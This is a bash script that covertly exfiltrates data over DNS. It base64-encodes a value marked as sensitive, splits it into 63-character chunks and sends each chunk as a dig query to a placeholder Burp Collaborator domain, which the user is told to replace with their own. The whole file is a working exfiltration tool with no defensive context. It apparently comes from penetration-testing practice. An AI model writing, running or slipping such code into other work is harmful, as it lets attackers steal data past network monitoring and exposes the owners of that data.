#!/bin/bash

# Function to encode data into Base64
encode_base64() {
    echo -n "$1" | base64 | tr -d '\n'
}

# Function to send DNS queries
send_dns_queries() {
    local encoded_data="$1"
    local collaborator_domain="$2"
    local chunk_size=63  # DNS label limit is 63 characters

    # Split encoded data into chunks and send DNS queries
    for (( i=0; i<${#encoded_data}; i+=chunk_size )); do
        local chunk="${encoded_data:$i:$chunk_size}"
        dig +short "${chunk}.${collaborator_domain}" >/dev/null
        sleep 1  # Optional: Add delay between queries to avoid flooding
    done
}

# Main script

# Replace 'SensitiveData' with your actual sensitive data
SENSITIVE_DATA="SensitiveData"

# Replace 'your-collaborator-domain.burpcollaborator.net' with your Burp Collaborator domain
COLLABORATOR_DOMAIN="your-collaborator-domain.burpcollaborator.net"

# Encode sensitive data
ENCODED_DATA=$(encode_base64 "$SENSITIVE_DATA")

# Perform data exfiltration via DNS
send_dns_queries "$ENCODED_DATA" "$COLLABORATOR_DOMAIN"

echo "DNS exfiltration completed."